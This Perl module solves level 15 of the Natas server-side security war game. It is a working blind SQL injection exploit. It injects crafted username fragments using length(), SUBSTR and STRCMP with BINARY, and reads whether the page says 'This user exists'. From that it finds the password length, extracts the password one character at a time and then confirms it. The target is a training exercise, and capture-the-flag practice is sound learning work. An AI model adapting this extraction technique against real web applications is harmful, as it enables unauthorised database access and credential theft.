package Hack::Natas::15;
use strict;
use warnings;
use v5.16.0;
# VERSION
# ABSTRACT: solve level 15 of the Natas server-side security war games

use Carp qw(confess);
use Moo;
with qw(Hack::Natas Hack::Natas::IncrementalSearch);

=head1 DESCRIPTION

This class will solve level 15.

=for Pod::Coverage BUILDARGS

=cut

sub BUILDARGS {
    my %args  = @_[1..$#_];
    return { level => 15, http_pass => $args{http_pass} };
}

=head1 METHODS

=head2 response_to_boolean

Does an HTTP GET of the resource described by the key-value
pairs, and parses the response. If it contains the string
C<This user exists>, then return true; if it contains
C<This user doesn't exist>, then return false.

=cut

sub response_to_boolean {
    my $self = shift;
    my $res  = $self->get( @_ );

    if (!$res->{success}) {
        require Data::Dumper;
        confess Data::Dumper::Dumper({
            response => $res,
            password_so_far => $self->password_so_far,
        });
    }
    elsif ($res->{content} =~ m/\QThis user exists/) {
        return 1;
    }
    elsif ($res->{content} =~ m/\QThis user doesn't exist/) {
        return;
    }
    else {
        require Data::Dumper;
        confess Data::Dumper::Dumper({
            response => $res,
            password_so_far => $self->password_so_far,
        });
    }
}

=head2 get_password_length

Although we suspect that the password is 32 characters long, we can
verify our assumption with an SQL injection. This does a search for
the password length (which ends up being 32, so I have restricted the
search space to avoid wasting time).

=cut

sub get_password_length {
    my $self = shift;
    my $sql_fragment = q{natas16" and length(password) = %d #};

    LENGTH:
    foreach my $i (31..33) {
        print "\rGuessing length: $i";
        if ( $self->response_to_boolean(
            debug => 1,
            username => sprintf($sql_fragment, $i)
        ) ) {
            say "\rPassword length is $i";
            return $i;
        }
        else {
            next LENGTH;
        }
    }
    confess "Couldn't determine length (maxed out at 33)";
}

=head2 guess_next_char

Given the current position in the password, guesses the next
character by iterating through the alphabet doing a
case-insensitive search. If a letter matches, then do a single
case-sensitive search to verify the case. Returns the found
character.

=cut

sub guess_next_char {
    my $self = shift;
    my $pos  = shift;
    my %sql  = (
        cmp  => <<'SQL_FRAGMENT',
natas16" and STRCMP(
    SUBSTR(password, %d, 1),
    '%s') = 0 #
SQL_FRAGMENT
        cmp_bin => <<'SQL_FRAGMENT',
natas16" and STRCMP(
    BINARY(SUBSTR(password, %d, 1)),
    BINARY('%s')) = 0 #
SQL_FRAGMENT
    );
    chomp for values %sql;

    NUM:
    foreach my $num (0..9) {
        printf "\rGuessing: %s%s", $self->password_so_far, $num;
        return $num if $self->response_to_boolean(
            debug => 1,
            username => sprintf($sql{cmp}, $pos, "$num"),
        );
    }

    CHAR:
    foreach my $char ('a'..'z') {
        printf "\rGuessing: %s%s", $self->password_so_far, $char;

        if ($self->response_to_boolean(
            debug => 1,
            username => sprintf($sql{cmp}, $pos, $char),
        )) { # verify case
            return $self->response_to_boolean(
                debug => 1,
                username => sprintf($sql{cmp_bin}, $pos, uc $char),
            ) ? uc $char : $char;
        }
    }
    confess sprintf q/Couldn't guess the next char; password so far is '%s'/, $self->password_so_far;
}

=head2 run

Runs the typical search, as implemented by L<Hack::Natas::IncrementalSearch>,
but then verifies the whole password in a single shot, using a case-sensitive
comparison.

=cut

around run => sub {
    my $orig = shift;
    my $self = shift;
    $orig->($self, @_);

    printf "\rPassword is '%s'; double-checking correctness...\n", $self->password_so_far;

    my $sql_fragment = q/natas16" and STRCMP(BINARY(password), BINARY('%s')) = 0 #/;
    say $self->response_to_boolean(
        debug => 1,
        username => sprintf($sql_fragment, $self->password_so_far)
    )
        ? 'Looks correct'
        : 'Looks incorrect, actually';
};

1;
